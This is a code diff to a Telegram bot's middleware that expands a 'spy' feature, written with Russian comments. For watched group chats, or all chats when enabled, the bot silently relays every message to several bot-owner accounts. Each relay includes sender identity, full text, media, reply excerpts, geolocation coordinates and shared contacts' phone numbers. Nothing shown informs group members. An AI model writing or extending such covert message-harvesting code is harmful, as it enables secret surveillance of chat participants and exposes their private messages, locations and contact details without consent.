@@ -12,7 +12,7 @@ logger = logging.getLogger(__name__)
 
 
 from whitelist import get_whitelist, log_unauthorized_chat, add_to_whitelist
-from config import CREATOR_ID, DISABLE_WHITELIST
+from config import CREATOR_ID, CREATOR_IDS, DISABLE_WHITELIST
 from spy import get_spy_chats, is_spy_all_enabled
 from user_manager import get_user_data
 from diseases import get_active_diseases
@@ -52,30 +52,146 @@ class WhitelistMiddleware(BaseMiddleware):
         spy_all = await is_spy_all_enabled()
 
         # Если это сообщение и группа под наблюдением
-        if (spy_all or chat.id in spy_chats) and isinstance(event, Message) and CREATOR_ID and int(CREATOR_ID) != 0:
-            bot = data.get('bot')
-            if bot:
+        if (spy_all or chat.id in spy_chats) and isinstance(event, Message):
+            destinations = set()
+            if CREATOR_ID:
                 try:
-                    from_user_name = escape_html(event.from_user.full_name) if (event.from_user and event.from_user.full_name) else "Unknown"
-                    from_user_id = event.from_user.id if event.from_user else 0
+                    destinations.add(int(CREATOR_ID))
+                except (ValueError, TypeError):
+                    pass
+            if CREATOR_IDS:
+                for cid in CREATOR_IDS:
+                    try:
+                        destinations.add(int(cid))
+                    except (ValueError, TypeError):
+                        pass
+            destinations.discard(0)
+
+            bot = data.get('bot')
+            if bot and destinations:
+                try:
+                    sender = getattr(event, 'from_user', None)
+                    if sender:
+                        from_user_name = escape_html(sender.full_name or "Unknown")
+                        from_user_id = sender.id
+                        username_str = f"@{escape_html(sender.username)} | " if sender.username else ""
+                    elif getattr(event, 'sender_chat', None):
+                        from_user_name = escape_html(event.sender_chat.title or "Unknown Chat")
+                        from_user_id = event.sender_chat.id
+                        username_str = f"@{escape_html(event.sender_chat.username)} | " if event.sender_chat.username else ""
+                    else:
+                        from_user_name = "Unknown"
+                        from_user_id = 0
+                        username_str = ""
+
                     safe_chat_title = escape_html(chat.title) if chat.title else "Чат"
 
-                    forward_info = " [Переслано]" if event.forward_origin else ""
-                    reply_info = f" [Ответ на MSG: {event.reply_to_message.message_id}]" if event.reply_to_message else ""
+                    forward_info = " [Переслано]" if (getattr(event, 'forward_origin', None) or getattr(event, 'forward_from', None) or getattr(event, 'forward_sender_name', None)) else ""
+                    
+                    reply_info = ""
+                    reply_to = getattr(event, 'reply_to_message', None)
+                    if reply_to:
+                        rep_id = getattr(reply_to, 'message_id', None)
+                        rep_text = getattr(reply_to, 'text', None) or getattr(reply_to, 'caption', None)
+                        if rep_text:
+                            short_rep = escape_html(rep_text[:60] + ("..." if len(rep_text) > 60 else ""))
+                            reply_info = f" [Ответ на MSG: {rep_id} (<i>«{short_rep}»</i>)]" if rep_id else f" [Ответ на (<i>«{short_rep}»</i>)]"
+                        elif rep_id:
+                            reply_info = f" [Ответ на MSG: {rep_id}]"
 
-                    header_text = (
+                    # Сборка содержимого сообщения
+                    content_parts = []
+
+                    # Текст сообщения
+                    event_text = getattr(event, 'text', None)
+                    if event_text:
+                        if len(event_text) > 3000:
+                            event_text = event_text[:3000] + "... (обрезано)"
+                        content_parts.append(f"\n💬 <b>Текст:</b>\n{escape_html(event_text)}")
+
+                    # Подпись к медиа
+                    event_caption = getattr(event, 'caption', None)
+                    if event_caption:
+                        if len(event_caption) > 3000:
+                            event_caption = event_caption[:3000] + "... (обрезано)"
+                        content_parts.append(f"\n📝 <b>Подпись:</b>\n{escape_html(event_caption)}")
+
+                    # Типы медиа
+                    has_media = False
+                    if getattr(event, 'photo', None):
+                        has_media = True
+                        content_parts.append("📷 <b>[Фото]</b>")
+                    elif getattr(event, 'video', None):
+                        has_media = True
+                        dur = f" ({event.video.duration} сек)" if getattr(event.video, 'duration', None) else ""
+                        content_parts.append(f"🎬 <b>[Видео{dur}]</b>")
+                    elif getattr(event, 'video_note', None):
+                        has_media = True
+                        dur = f" ({event.video_note.duration} сек)" if getattr(event.video_note, 'duration', None) else ""
+                        content_parts.append(f"⭕ <b>[Видеосообщение / Кружочек{dur}]</b>")
+                    elif getattr(event, 'voice', None):
+                        has_media = True
+                        dur = f" ({event.voice.duration} сек)" if getattr(event.voice, 'duration', None) else ""
+                        content_parts.append(f"🎤 <b>[Голосовое сообщение{dur}]</b>")
+                    elif getattr(event, 'audio', None):
+                        has_media = True
+                        title = getattr(event.audio, 'title', None) or getattr(event.audio, 'file_name', None) or ""
+                        dur = f" ({event.audio.duration} сек)" if getattr(event.audio, 'duration', None) else ""
+                        content_parts.append(f"🎵 <b>[Аудио: {escape_html(title)}{dur}]</b>")
+                    elif getattr(event, 'document', None):
+                        has_media = True
+                        fname = getattr(event.document, 'file_name', None) or "документ"
+                        content_parts.append(f"📄 <b>[Документ: {escape_html(fname)}]</b>")
+                    elif getattr(event, 'sticker', None):
+                        has_media = True
+                        emoji = getattr(event.sticker, 'emoji', None) or ""
+                        content_parts.append(f"🖼 <b>[Стикер {emoji}]</b>")
+                    elif getattr(event, 'animation', None):
+                        has_media = True
+                        content_parts.append("🎞 <b>[GIF / Анимация]</b>")
+                    elif getattr(event, 'dice', None):
+                        dice_emoji = getattr(event.dice, 'emoji', '🎲')
+                        dice_val = getattr(event.dice, 'value', '')
+                        content_parts.append(f"🎲 <b>[Дайс: {dice_emoji} | Значение: {dice_val}]</b>")
+                    elif getattr(event, 'poll', None):
+                        poll_q = getattr(event.poll, 'question', '')
+                        content_parts.append(f"📊 <b>[Опрос: {escape_html(poll_q)}]</b>")
+                    elif getattr(event, 'location', None):
+                        content_parts.append(f"📍 <b>[Геолокация: {event.location.latitude}, {event.location.longitude}]</b>")
+                    elif getattr(event, 'contact', None):
+                        c_name = escape_html(f"{getattr(event.contact, 'first_name', '') or ''} {getattr(event.contact, 'last_name', '') or ''}".strip())
+                        c_phone = escape_html(getattr(event.contact, 'phone_number', '') or "")
+                        content_parts.append(f"📞 <b>[Контакт: {c_name} ({c_phone})]</b>")
+
+                    content_str = "\n".join(content_parts) if content_parts else "\n<i>(Пустое сообщение или системное действие)</i>"
+
+                    event_msg_id = getattr(event, 'message_id', 0)
+                    clean_cid = str(chat.id).replace("-100", "").replace("-", "")
+                    msg_link = f"https://t.me/c/{clean_cid}/{event_msg_id}" if clean_cid else ""
+                    msg_id_display = f'<a href="{msg_link}">{event_msg_id}</a>' if msg_link else f'<code>{event_msg_id}</code>'
+
+                    spy_message_text = (
                         f"👁 <b>[{safe_chat_title} | <code>{chat.id}</code>]</b>\n"
-                        f"👤 <b>{from_user_name}</b> (<code>{from_user_id}</code>)\n"
-                        f"🆔 MSG: <code>{event.message_id}</code>{forward_info}{reply_info}"
+                        f"👤 <b>{from_user_name}</b> ({username_str}ID: <code>{from_user_id}</code>)\n"
+                        f"🆔 MSG: {msg_id_display}{forward_info}{reply_info}\n"
+                        f"{content_str}"
                     )
-                    try:
-                        await bot.send_message(chat_id=CREATOR_ID, text=header_text, parse_mode="HTML")
+
+                    for cid in destinations:
                         try:
-                            await event.forward(chat_id=CREATOR_ID)
-                        except Exception:
-                            await event.copy_to(chat_id=CREATOR_ID)
-                    except Exception as send_err:
-                        logger.warning("Не удалось отправить сообщение шпионажа: %s", send_err)
+                            await bot.send_message(chat_id=cid, text=spy_message_text, parse_mode="HTML")
+                        except Exception as send_err:
+                            logger.warning("Не удалось отправить сообщение шпионажа админу %s: %s", cid, send_err)
+
+                        # Если сообщение содержит медиа, пытаемся переслать или скопировать сам файл
+                        if has_media:
+                            try:
+                                try:
+                                    await event.forward(chat_id=cid)
+                                except Exception:
+                                    await event.copy_to(chat_id=cid)
+                            except Exception as media_err:
+                                logger.debug("Не удалось переслать/скопировать медиа шпионажа: %s", media_err)
                 except Exception as e:
                     logger.error(f"Spy Error: {e}")
 
